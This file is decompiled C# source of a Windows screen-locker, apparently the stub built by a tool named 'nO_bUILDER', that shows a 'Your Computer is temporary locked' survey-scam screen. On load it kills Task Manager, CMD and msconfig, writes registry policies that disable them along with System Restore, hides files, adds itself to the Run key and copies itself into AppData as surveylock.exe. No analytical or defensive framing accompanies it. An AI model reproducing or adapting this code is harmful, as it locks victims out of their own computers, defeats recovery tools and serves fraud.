using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using nO_bUILDER.My;

namespace nO_bUILDER;

[DesignerGenerated]
public class Form1 : Form
{
	private static List<WeakReference> __ENCList = new List<WeakReference>();

	private IContainer components;

	[AccessedThroughProperty("TextBox2")]
	private TextBox _TextBox2;

	[AccessedThroughProperty("TextBox1")]
	private TextBox _TextBox1;

	[AccessedThroughProperty("Label5")]
	private Label _Label5;

	[AccessedThroughProperty("InfluenceButton2")]
	private InfluenceButton _InfluenceButton2;

	[AccessedThroughProperty("InfluenceTextBox1")]
	private InfluenceTextBox _InfluenceTextBox1;

	[AccessedThroughProperty("Label3")]
	private Label _Label3;

	[AccessedThroughProperty("Label4")]
	private Label _Label4;

	[AccessedThroughProperty("VTheme1")]
	private VTheme _VTheme1;

	[AccessedThroughProperty("Label2")]
	private Label _Label2;

	[AccessedThroughProperty("InfluenceButton1")]
	private InfluenceButton _InfluenceButton1;

	[AccessedThroughProperty("Label1")]
	private Label _Label1;

	[AccessedThroughProperty("Timer1")]
	private Timer _Timer1;

	[AccessedThroughProperty("Label6")]
	private Label _Label6;

	[AccessedThroughProperty("Label9")]
	private Label _Label9;

	[AccessedThroughProperty("Label8")]
	private Label _Label8;

	[AccessedThroughProperty("Label7")]
	private Label _Label7;

	[AccessedThroughProperty("Label10")]
	private Label _Label10;

	private string[] options;

	private string text1;

	private string text2;

	private string cb;

	private const string Filesplit = "@thi3$IS%A#WO&NDER4F$UL$L#AP$P8*R*E*E5*$LL$Y@";

	private Process[] myProcesses;

	internal virtual TextBox TextBox2
	{
		[DebuggerNonUserCode]
		get
		{
			return _TextBox2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TextBox2 = value;
		}
	}

	internal virtual TextBox TextBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _TextBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TextBox1 = value;
		}
	}

	internal virtual Label Label5
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label5 = value;
		}
	}

	internal virtual InfluenceButton InfluenceButton2
	{
		[DebuggerNonUserCode]
		get
		{
			return _InfluenceButton2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = InfluenceButton2_Click_1;
			if (_InfluenceButton2 != null)
			{
				((Control)_InfluenceButton2).remove_Click(eventHandler);
			}
			_InfluenceButton2 = value;
			if (_InfluenceButton2 != null)
			{
				((Control)_InfluenceButton2).add_Click(eventHandler);
			}
		}
	}

	internal virtual InfluenceTextBox InfluenceTextBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _InfluenceTextBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_InfluenceTextBox1 = value;
		}
	}

	internal virtual Label Label3
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label3 = value;
		}
	}

	internal virtual Label Label4
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label4 = value;
		}
	}

	internal virtual VTheme VTheme1
	{
		[DebuggerNonUserCode]
		get
		{
			return _VTheme1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = VTheme1_Click_1;
			if (_VTheme1 != null)
			{
				((Control)_VTheme1).remove_Click(eventHandler);
			}
			_VTheme1 = value;
			if (_VTheme1 != null)
			{
				((Control)_VTheme1).add_Click(eventHandler);
			}
		}
	}

	internal virtual Label Label2
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label2 = value;
		}
	}

	internal virtual InfluenceButton InfluenceButton1
	{
		[DebuggerNonUserCode]
		get
		{
			return _InfluenceButton1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = InfluenceButton1_Click_1;
			if (_InfluenceButton1 != null)
			{
				((Control)_InfluenceButton1).remove_Click(eventHandler);
			}
			_InfluenceButton1 = value;
			if (_InfluenceButton1 != null)
			{
				((Control)_InfluenceButton1).add_Click(eventHandler);
			}
		}
	}

	internal virtual Label Label1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label1 = value;
		}
	}

	internal virtual Timer Timer1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Timer1 = value;
		}
	}

	internal virtual Label Label6
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label6 = value;
		}
	}

	internal virtual Label Label9
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label9;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label9 = value;
		}
	}

	internal virtual Label Label8
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label8;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label8 = value;
		}
	}

	internal virtual Label Label7
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label7;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label7 = value;
		}
	}

	internal virtual Label Label10
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label10;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label10 = value;
		}
	}

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		__ENCAddToList(this);
		myProcesses = Process.GetProcesses();
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	private static void __ENCAddToList(object value)
	{
		checked
		{
			lock (__ENCList)
			{
				if (__ENCList.Count == __ENCList.Capacity)
				{
					int num = 0;
					int num2 = __ENCList.Count - 1;
					int num3 = 0;
					while (true)
					{
						int num4 = num3;
						int num5 = num2;
						if (num4 > num5)
						{
							break;
						}
						WeakReference weakReference = __ENCList[num3];
						if (weakReference.IsAlive)
						{
							if (num3 != num)
							{
								__ENCList[num] = __ENCList[num3];
							}
							num++;
						}
						num3++;
					}
					__ENCList.RemoveRange(num, __ENCList.Count - num);
					__ENCList.Capacity = __ENCList.Count;
				}
				__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && components != null) ? true : false)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0079: Expected O, but got Unknown
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Expected O, but got Unknown
		//IL_0085: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Expected O, but got Unknown
		//IL_00a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		//IL_00b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bb: Expected O, but got Unknown
		//IL_00bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c6: Expected O, but got Unknown
		//IL_00d2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00dc: Expected O, but got Unknown
		//IL_029f: Unknown result type (might be due to invalid IL or missing references)
		//IL_02a9: Expected O, but got Unknown
		//IL_039c: Unknown result type (might be due to invalid IL or missing references)
		//IL_03a6: Expected O, but got Unknown
		//IL_0453: Unknown result type (might be due to invalid IL or missing references)
		//IL_045d: Expected O, but got Unknown
		//IL_050d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0517: Expected O, but got Unknown
		//IL_05c4: Unknown result type (might be due to invalid IL or missing references)
		//IL_05ce: Expected O, but got Unknown
		//IL_067b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0685: Expected O, but got Unknown
		//IL_07d6: Unknown result type (might be due to invalid IL or missing references)
		//IL_07e0: Expected O, but got Unknown
		//IL_087d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0887: Expected O, but got Unknown
		//IL_09bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_09c6: Expected O, but got Unknown
		//IL_0a69: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a73: Expected O, but got Unknown
		//IL_0b1f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b29: Expected O, but got Unknown
		//IL_0bcf: Unknown result type (might be due to invalid IL or missing references)
		//IL_0bd9: Expected O, but got Unknown
		//IL_0c75: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c7f: Expected O, but got Unknown
		//IL_0d4d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d57: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		Timer1 = new Timer(components);
		VTheme1 = new VTheme();
		Label10 = new Label();
		Label9 = new Label();
		Label8 = new Label();
		Label7 = new Label();
		Label6 = new Label();
		TextBox2 = new TextBox();
		TextBox1 = new TextBox();
		Label5 = new Label();
		InfluenceButton2 = new InfluenceButton();
		InfluenceTextBox1 = new InfluenceTextBox();
		Label4 = new Label();
		Label3 = new Label();
		Label2 = new Label();
		InfluenceButton1 = new InfluenceButton();
		Label1 = new Label();
		((Control)VTheme1).SuspendLayout();
		((Control)this).SuspendLayout();
		Timer1.set_Enabled(true);
		Timer1.set_Interval(200);
		VTheme1.BorderStyle = (FormBorderStyle)0;
		VTheme1.Colors = new Bloom[0];
		((Control)VTheme1).get_Controls().Add((Control)(object)Label10);
		((Control)VTheme1).get_Controls().Add((Control)(object)Label9);
		((Control)VTheme1).get_Controls().Add((Control)(object)Label8);
		((Control)VTheme1).get_Controls().Add((Control)(object)Label7);
		((Control)VTheme1).get_Controls().Add((Control)(object)Label6);
		((Control)VTheme1).get_Controls().Add((Control)(object)TextBox2);
		((Control)VTheme1).get_Controls().Add((Control)(object)TextBox1);
		((Control)VTheme1).get_Controls().Add((Control)(object)Label5);
		((Control)VTheme1).get_Controls().Add((Control)(object)InfluenceButton2);
		((Control)VTheme1).get_Controls().Add((Control)(object)InfluenceTextBox1);
		((Control)VTheme1).get_Controls().Add((Control)(object)Label4);
		((Control)VTheme1).get_Controls().Add((Control)(object)Label3);
		((Control)VTheme1).get_Controls().Add((Control)(object)Label2);
		((Control)VTheme1).get_Controls().Add((Control)(object)InfluenceButton1);
		((Control)VTheme1).get_Controls().Add((Control)(object)Label1);
		VTheme1.Customization = "";
		VTheme1.Dock = (DockStyle)5;
		VTheme1.Font = new Font("Century Gothic", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0);
		VTheme1.Image = null;
		VTheme vTheme = VTheme1;
		Point location = new Point(0, 0);
		((Control)vTheme).set_Location(location);
		VTheme1.Movable = true;
		((Control)VTheme1).set_Name("VTheme1");
		VTheme1.NoRounding = false;
		VTheme1.Sizable = false;
		VTheme vTheme2 = VTheme1;
		Size size = new Size(1032, 578);
		((Control)vTheme2).set_Size(size);
		VTheme1.SmartBounds = true;
		VTheme1.StartPosition = (FormStartPosition)2;
		((Control)VTheme1).set_TabIndex(11);
		VTheme1.Text = "                                                                               Survey Says....";
		VTheme1.TransparencyKey = Color.Fuchsia;
		VTheme1.Transparent = false;
		Label10.set_AutoSize(true);
		((Control)Label10).set_BackColor(Color.Transparent);
		((Control)Label10).set_Font(new Font("Century Gothic", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Label10).set_ForeColor(Color.White);
		Label label = Label10;
		location = new Point(740, 258);
		((Control)label).set_Location(location);
		((Control)Label10).set_Name("Label10");
		Label label2 = Label10;
		size = new Size(96, 21);
		((Control)label2).set_Size(size);
		((Control)Label10).set_TabIndex(15);
		Label10.set_Text("# Msconfig");
		Label10.set_TextAlign((ContentAlignment)2);
		Label9.set_AutoSize(true);
		((Control)Label9).set_BackColor(Color.Transparent);
		((Control)Label9).set_Font(new Font("Century Gothic", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Label9).set_ForeColor(Color.White);
		Label label3 = Label9;
		location = new Point(740, 227);
		((Control)label3).set_Location(location);
		((Control)Label9).set_Name("Label9");
		Label label4 = Label9;
		size = new Size(136, 21);
		((Control)label4).set_Size(size);
		((Control)Label9).set_TabIndex(14);
		Label9.set_Text("# Task Manager");
		Label9.set_TextAlign((ContentAlignment)2);
		Label8.set_AutoSize(true);
		((Control)Label8).set_BackColor(Color.Transparent);
		((Control)Label8).set_Font(new Font("Century Gothic", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Label8).set_ForeColor(Color.White);
		Label label5 = Label8;
		location = new Point(740, 195);
		((Control)label5).set_Location(location);
		((Control)Label8).set_Name("Label8");
		Label label6 = Label8;
		size = new Size(66, 21);
		((Control)label6).set_Size(size);
		((Control)Label8).set_TabIndex(13);
		Label8.set_Text("# CMD");
		Label8.set_TextAlign((ContentAlignment)2);
		Label7.set_AutoSize(true);
		((Control)Label7).set_BackColor(Color.Transparent);
		((Control)Label7).set_Font(new Font("Century Gothic", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Label7).set_ForeColor(Color.White);
		Label label7 = Label7;
		location = new Point(740, 162);
		((Control)label7).set_Location(location);
		((Control)Label7).set_Name("Label7");
		Label label8 = Label7;
		size = new Size(56, 21);
		((Control)label8).set_Size(size);
		((Control)Label7).set_TabIndex(12);
		Label7.set_Text("# Run");
		Label7.set_TextAlign((ContentAlignment)2);
		Label6.set_AutoSize(true);
		((Control)Label6).set_BackColor(Color.Transparent);
		((Control)Label6).set_Font(new Font("Century Gothic", 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Label6).set_ForeColor(Color.White);
		Label label9 = Label6;
		location = new Point(729, 91);
		((Control)label9).set_Location(location);
		((Control)Label6).set_Name("Label6");
		Label label10 = Label6;
		size = new Size(260, 22);
		((Control)label10).set_Size(size);
		((Control)Label6).set_TabIndex(11);
		Label6.set_Text("Currently Disabled Features");
		TextBox textBox = TextBox2;
		location = new Point(12, 74);
		((Control)textBox).set_Location(location);
		((Control)TextBox2).set_Name("TextBox2");
		TextBox textBox2 = TextBox2;
		size = new Size(10, 23);
		((Control)textBox2).set_Size(size);
		((Control)TextBox2).set_TabIndex(10);
		((Control)TextBox2).set_Visible(false);
		TextBox textBox3 = TextBox1;
		location = new Point(12, 74);
		((Control)textBox3).set_Location(location);
		((Control)TextBox1).set_Name("TextBox1");
		TextBox textBox4 = TextBox1;
		size = new Size(10, 23);
		((Control)textBox4).set_Size(size);
		((Control)TextBox1).set_TabIndex(9);
		((Control)TextBox1).set_Visible(false);
		Label5.set_AutoSize(true);
		((Control)Label5).set_BackColor(Color.Transparent);
		((Control)Label5).set_Font(new Font("Century Gothic", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Label5).set_ForeColor(Color.White);
		Label label11 = Label5;
		location = new Point(990, 9);
		((Control)label11).set_Location(location);
		((Control)Label5).set_Name("Label5");
		Label label12 = Label5;
		size = new Size(30, 17);
		((Control)label12).set_Size(size);
		((Control)Label5).set_TabIndex(8);
		Label5.set_Text(" ⓧ ");
		Label5.set_TextAlign((ContentAlignment)2);
		((Control)InfluenceButton2).set_BackColor(Color.Transparent);
		((Control)InfluenceButton2).set_Font(new Font("Century Gothic", 12f, (FontStyle)2, (GraphicsUnit)3, (byte)0));
		InfluenceButton influenceButton = InfluenceButton2;
		location = new Point(23, 490);
		((Control)influenceButton).set_Location(location);
		((Control)InfluenceButton2).set_Name("InfluenceButton2");
		InfluenceButton influenceButton2 = InfluenceButton2;
		size = new Size(667, 34);
		((Control)influenceButton2).set_Size(size);
		((Control)InfluenceButton2).set_TabIndex(7);
		((Control)InfluenceButton2).set_Text("Verify Unlock Code !");
		InfluenceButton2.TextAlignment = (StringAlignment)1;
		((Control)InfluenceTextBox1).set_BackColor(Color.Transparent);
		((Control)InfluenceTextBox1).set_ForeColor(Color.White);
		InfluenceTextBox influenceTextBox = InfluenceTextBox1;
		location = new Point(23, 442);
		((Control)influenceTextBox).set_Location(location);
		InfluenceTextBox1.MaxLength = 32767;
		((Control)InfluenceTextBox1).set_Name("InfluenceTextBox1");
		InfluenceTextBox influenceTextBox2 = InfluenceTextBox1;
		size = new Size(667, 27);
		((Control)influenceTextBox2).set_Size(size);
		((Control)InfluenceTextBox1).set_TabIndex(6);
		InfluenceTextBox1.TextAlignment = (HorizontalAlignment)2;
		InfluenceTextBox1.UseSystemPasswordChar = false;
		Label4.set_AutoSize(true);
		((Control)Label4).set_BackColor(Color.Transparent);
		((Control)Label4).set_Font(new Font("Century Gothic", 15.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Label4).set_ForeColor(Color.White);
		Label label13 = Label4;
		location = new Point(212, 392);
		((Control)label13).set_Location(location);
		((Control)Label4).set_Name("Label4");
		Label label14 = Label4;
		size = new Size(286, 24);
		((Control)label14).set_Size(size);
		((Control)Label4).set_TabIndex(5);
		Label4.set_Text("Code to unlock computer:\r\n");
		Label3.set_AutoSize(true);
		((Control)Label3).set_BackColor(Color.Transparent);
		((Control)Label3).set_Font(new Font("Century Gothic", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Label3).set_ForeColor(Color.White);
		Label label15 = Label3;
		location = new Point(20, 262);
		((Control)label15).set_Location(location);
		((Control)Label3).set_Name("Label3");
		Label label16 = Label3;
		size = new Size(254, 17);
		((Control)label16).set_Size(size);
		((Control)Label3).set_TabIndex(4);
		Label3.set_Text("Don't do this, and see what happens !");
		Label3.set_TextAlign((ContentAlignment)2);
		Label2.set_AutoSize(true);
		((Control)Label2).set_BackColor(Color.Transparent);
		((Control)Label2).set_Font(new Font("Century Gothic", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Label2).set_ForeColor(Color.White);
		Label label17 = Label2;
		location = new Point(37, 166);
		((Control)label17).set_Location(location);
		((Control)Label2).set_Name("Label2");
		Label label18 = Label2;
		size = new Size(653, 34);
		((Control)label18).set_Size(size);
		((Control)Label2).set_TabIndex(3);
		Label2.set_Text(componentResourceManager.GetString("Label2.Text"));
		Label2.set_TextAlign((ContentAlignment)2);
		((Control)InfluenceButton1).set_BackColor(Color.Transparent);
		((Control)InfluenceButton1).set_Font(new Font("Century Gothic", 12f, (FontStyle)2, (GraphicsUnit)3, (byte)0));
		InfluenceButton influenceButton3 = InfluenceButton1;
		location = new Point(23, 326);
		((Control)influenceButton3).set_Location(location);
		((Control)InfluenceButton1).set_Name("InfluenceButton1");
		InfluenceButton influenceButton4 = InfluenceButton1;
		size = new Size(667, 34);
		((Control)influenceButton4).set_Size(size);
		((Control)InfluenceButton1).set_TabIndex(2);
		((Control)InfluenceButton1).set_Text("View Survey, Complete it, Unlock my Computer!");
		InfluenceButton1.TextAlignment = (StringAlignment)1;
		Label1.set_AutoSize(true);
		((Control)Label1).set_BackColor(Color.Transparent);
		((Control)Label1).set_Font(new Font("Century Gothic", 18f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Label1).set_ForeColor(Color.White);
		Label label19 = Label1;
		location = new Point(133, 84);
		((Control)label19).set_Location(location);
		((Control)Label1).set_Name("Label1");
		Label label20 = Label1;
		size = new Size(453, 30);
		((Control)label20).set_Size(size);
		((Control)Label1).set_TabIndex(0);
		Label1.set_Text("Your Computer is temporary locked !");
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(1032, 578);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)VTheme1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_Name("Form1");
		((Form)this).set_Text("                                                                               Survey Says....");
		((Form)this).set_TransparencyKey(Color.Fuchsia);
		((Control)VTheme1).ResumeLayout(false);
		((Control)VTheme1).PerformLayout();
		((Control)this).ResumeLayout(false);
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void Form1_Load(object sender, EventArgs e)
	{
		int try0001_dispatch = -1;
		int num = default(int);
		int num2 = default(int);
		int num3 = default(int);
		string text = default(string);
		string fileName = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				checked
				{
					switch (try0001_dispatch)
					{
					default:
						num = 1;
						FileSystem.FileOpen(1, Application.get_ExecutablePath(), (OpenMode)32, (OpenAccess)1, (OpenShare)3, -1);
						goto IL_0014;
					case 894:
						{
							num2 = num;
							if (num3 > -2)
							{
								switch (num3)
								{
								case 1:
									break;
								default:
									goto end_IL_0001;
								}
							}
							int num4 = unchecked(num2 + 1);
							num2 = 0;
							switch (num4)
							{
							case 1:
								break;
							case 2:
								goto IL_0014;
							case 3:
								goto IL_0029;
							case 4:
								goto IL_003e;
							case 5:
								goto IL_0053;
							case 6:
								goto IL_006c;
							case 7:
								goto IL_0085;
							case 8:
								goto IL_009e;
							case 9:
								goto IL_00b9;
							case 10:
								goto IL_00ce;
							case 11:
								goto IL_00ea;
							case 12:
								goto IL_00ff;
							case 13:
								goto IL_0107;
							case 14:
								goto IL_011e;
							case 15:
								goto IL_0135;
							case 16:
								goto IL_0144;
							case 17:
								goto IL_014f;
							case 18:
								goto IL_0159;
							case 19:
								goto IL_0168;
							case 20:
								goto IL_0177;
							case 21:
								goto IL_0186;
							case 22:
								goto IL_01a9;
							case 23:
								goto IL_01cc;
							case 24:
								goto IL_01d6;
							case 25:
								goto IL_01f5;
							case 26:
								goto IL_0218;
							case 27:
								goto IL_022c;
							case 28:
								goto IL_0234;
							case 29:
								goto IL_0262;
							case 30:
								goto IL_027d;
							case 31:
								goto IL_029a;
							case 32:
								goto IL_02c8;
							case 33:
								goto end_IL_0001_2;
							default:
								goto end_IL_0001;
							case 34:
							case 35:
								goto end_IL_0001_3;
							}
							goto default;
						}
						IL_02c8:
						ProjectData.ClearProjectError();
						num3 = -4;
						break;
						IL_029a:
						num = 31;
						File.Copy(Path.GetTempPath() + "Update.exe", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData).ToString() + "\\surveylock.exe");
						goto IL_02c8;
						IL_0014:
						num = 2;
						text1 = Strings.Space((int)FileSystem.LOF(1));
						goto IL_0029;
						IL_0029:
						num = 3;
						text2 = Strings.Space((int)FileSystem.LOF(1));
						goto IL_003e;
						IL_003e:
						num = 4;
						cb = Strings.Space((int)FileSystem.LOF(1));
						goto IL_0053;
						IL_0053:
						num = 5;
						FileSystem.FileGet(1, ref text1, -1L, false);
						goto IL_006c;
						IL_006c:
						num = 6;
						FileSystem.FileGet(1, ref text2, -1L, false);
						goto IL_0085;
						IL_0085:
						num = 7;
						FileSystem.FileGet(1, ref cb, -1L, false);
						goto IL_009e;
						IL_009e:
						num = 8;
						options = Strings.Split(text2, "@thi3$IS%A#WO&NDER4F$UL$L#AP$P8*R*E*E5*$LL$Y@", -1, (CompareMethod)0);
						goto IL_00b9;
						IL_00b9:
						num = 9;
						FileSystem.FileClose(new int[1] { 1 });
						goto IL_00ce;
						IL_00ce:
						num = 10;
						options = Strings.Split(text1, "@thi3$IS%A#WO&NDER4F$UL$L#AP$P8*R*E*E5*$LL$Y@", -1, (CompareMethod)0);
						goto IL_00ea;
						IL_00ea:
						num = 11;
						FileSystem.FileClose(new int[1] { 1 });
						goto IL_00ff;
						IL_00ff:
						ProjectData.ClearProjectError();
						num3 = -2;
						goto IL_0107;
						IL_0107:
						num = 13;
						TextBox1.set_Text(options[1]);
						goto IL_011e;
						IL_011e:
						num = 14;
						TextBox2.set_Text(options[2]);
						goto IL_0135;
						IL_0135:
						num = 15;
						((Form)this).set_Text("");
						goto IL_0144;
						IL_0144:
						num = 16;
						((Form)this).set_ShowInTaskbar(false);
						goto IL_014f;
						IL_014f:
						num = 17;
						TMListViewDelete.Running = true;
						goto IL_0159;
						IL_0159:
						num = 18;
						KillProcess("taskmgr");
						goto IL_0168;
						IL_0168:
						num = 19;
						KillProcess("cmd");
						goto IL_0177;
						IL_0177:
						num = 20;
						KillProcess("msconfig");
						goto IL_0186;
						IL_0186:
						num = 21;
						((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableTaskMgr", (object)"1", RegistryValueKind.DWord);
						goto IL_01a9;
						IL_01a9:
						num = 22;
						((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\System", "DisableCMD", (object)"1", RegistryValueKind.DWord);
						goto IL_01cc;
						IL_01cc:
						num = 23;
						text = "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced";
						goto IL_01d6;
						IL_01d6:
						num = 24;
						((ServerComputer)MyProject.Computer).get_Registry().SetValue(text, "Hidden", (object)"0", RegistryValueKind.DWord);
						goto IL_01f5;
						IL_01f5:
						num = 25;
						((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore", "DisableSR", (object)"1", RegistryValueKind.DWord);
						goto IL_0218;
						IL_0218:
						num = 26;
						AddReg(((Form)this).get_Text(), Application.get_ExecutablePath());
						goto IL_022c;
						IL_022c:
						ProjectData.ClearProjectError();
						num3 = -3;
						goto IL_0234;
						IL_0234:
						num = 28;
						if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData).ToString() + "\\surveylock.exe"))
						{
							goto end_IL_0001_3;
						}
						goto IL_0262;
						IL_0262:
						num = 29;
						fileName = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData).ToString() + "\\surveylock.exe";
						goto IL_027d;
						IL_027d:
						num = 30;
						File.Copy(Application.get_ExecutablePath(), Path.GetTempPath() + "Update.exe");
						goto IL_029a;
						end_IL_0001_2:
						break;
					}
					num = 33;
					Process.Start(fileName);
					break;
				}
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 894;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void Label5_Click(object sender, EventArgs e)
	{
		((Control)MyProject.Forms.Form2).Show();
		MyProject.Forms.Form2.PictureBox1.set_Image(MyProject.Forms.Form2.PictureBox1.get_Image());
	}

	public static void AddReg(string name, string path)
	{
		RegistryKey currentUser = Registry.CurrentUser;
		RegistryKey registryKey = currentUser.OpenSubKey("software\\microsoft\\windows\\currentversion\\run", writable: true);
		registryKey.SetValue(name, path, RegistryValueKind.String);
	}

	public static void RemoveReg(string name)
	{
		RegistryKey currentUser = Registry.CurrentUser;
		RegistryKey registryKey = currentUser.OpenSubKey("software\\microsoft\\windows\\currentversion\\run", writable: true);
		registryKey.DeleteValue(name);
	}

	private void InfluenceButton1_Click(object sender, EventArgs e)
	{
	}

	public string ToBase64(byte[] data)
	{
		if (data == null)
		{
			throw new ArgumentNullException("data");
		}
		return Convert.ToBase64String(data);
	}

	public byte[] FromBase64(string base64)
	{
		if (base64 == null)
		{
			throw new ArgumentNullException("base64");
		}
		return Convert.FromBase64String(base64);
	}

	private void InfluenceButton2_Click(object sender, EventArgs e)
	{
	}

	private void Label6_Click(object sender, EventArgs e)
	{
		Application.Exit();
	}

	public void KillProcess(string processname)
	{
		try
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				if (Operators.CompareString(process.ProcessName, processname, false) == 0)
				{
					process.Kill();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void KillWindow(string title)
	{
		try
